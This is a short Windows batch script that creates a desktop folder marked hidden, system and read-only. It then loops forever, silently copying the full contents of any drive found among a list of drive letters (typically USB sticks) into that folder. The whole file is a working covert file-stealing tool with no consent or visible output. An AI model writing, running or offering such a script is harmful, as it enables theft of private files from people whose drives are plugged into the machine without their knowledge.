@echo off
setlocal EnableDelayedExpansion
:try
IF EXIST "C:\Users\"%USERNAME%"\Desktop\NCopy" (
 SET l="E:\" "F:\" "G:\" "M:\" "N:\" "D:\" "H:\" "I:\" "L:\" "O:\" "S:\" "U:\"
 FOR %%a in (%l%) DO (
  IF EXIST %%a (
   XCOPY %%a "C:\Users\"%USERNAME%"\Desktop\NCopy" /s /i /y /q
  )
 )
) ELSE (
 MKDIR "C:\Users\"%USERNAME%"\Desktop\NCopy"
 ATTRIB "C:\Users\"%USERNAME%"\Desktop\NCopy" +r +h +s
)
goto try